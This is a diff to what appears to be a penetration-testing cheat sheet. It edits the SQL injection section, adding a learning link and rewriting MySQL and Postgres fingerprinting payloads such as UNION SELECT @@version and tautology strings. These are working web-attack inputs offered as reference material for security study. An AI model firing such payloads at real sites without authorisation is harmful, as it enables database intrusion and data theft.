@@ -291,6 +291,7 @@ TRY OTHER LFI METHODS:
 ### ============================================================
 ### SQL Injection
 ### ============================================================
+Learn SQL Injection: http://websec.fr/level01/index.php
 SQL Cheatsheet: http://www.cheat-sheets.org/sites/sql.su/  
 DB Specific SQLi Cheatsheets: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
 Confirm vulnerability: `http://targetsite.com/price.php?id=2   ->   http://targetsite.com/price.php?id=1+1`
@@ -302,9 +303,9 @@ NOTE: SQL does not have 0th index for strings. Strings start at 1 e.g. SUBSTR('h
 /* MySQL */                                                        -- FINGERPRINTING:        
    ' union select current_user, 1'
    ' union select @@version, 1'
-   news.php?id=1 /*! AND 1=1 */--           -- via. comments
-   news.php?id=1 AND 'aa'=CONCAT('a','a')   -- via. MySQL CONCAT()
-   news.php?id=1 AND 1=2 UNION SELECT 1, 2, @@version  -- via. db version
+   news.php?id=1 /*! AND 1=1 */--              -- via. comments
+   news.php?id=' UNION SELECT 1, @@version--   -- via. db version
+   news.php?id=' or CONCAT('a','a')='aa        -- via. MySQL CONCAT()
 
 /* Postgres */
    http://www.example.com/news.php?id=1 AND 1=1::int               -- via. typecast
